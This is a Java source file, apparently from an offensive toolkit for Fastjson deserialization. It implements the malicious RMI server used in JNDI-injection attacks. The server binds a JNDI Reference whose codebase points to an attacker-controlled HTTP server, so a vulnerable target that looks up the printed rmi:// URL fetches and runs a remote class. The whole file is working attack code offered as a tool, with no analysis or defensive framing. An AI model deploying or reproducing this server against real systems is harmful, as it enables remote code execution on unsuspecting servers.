package com.fastjsontool.exploit.JNDI;

import com.fastjsontool.exploit.Info;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 根据选择的payload创建一个RMI服务
 */
public class RMISERVER {
    private static String ipaddr= Info.ipaddr;
    private static int Httport=Info.httpPort;
    private static int RMIPort=Info.port;
    private static String className=Info.className;

    public static void rmiServer() throws IOException, NamingException, AlreadyBoundException, InterruptedException {
        Registry registry = LocateRegistry.createRegistry(RMIPort);
        String url = "http://" + ipaddr + ":" + Integer.toString(Httport) + "/"; //获取本地启动的java简易http服务
        Reference reference = new Reference(className,className,url); //创建服务
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind(className,referenceWrapper);
        System.out.println("服务启动："+"rmi://"+ipaddr+":"+Integer.toString(RMIPort)+"/"+className);
    }


}
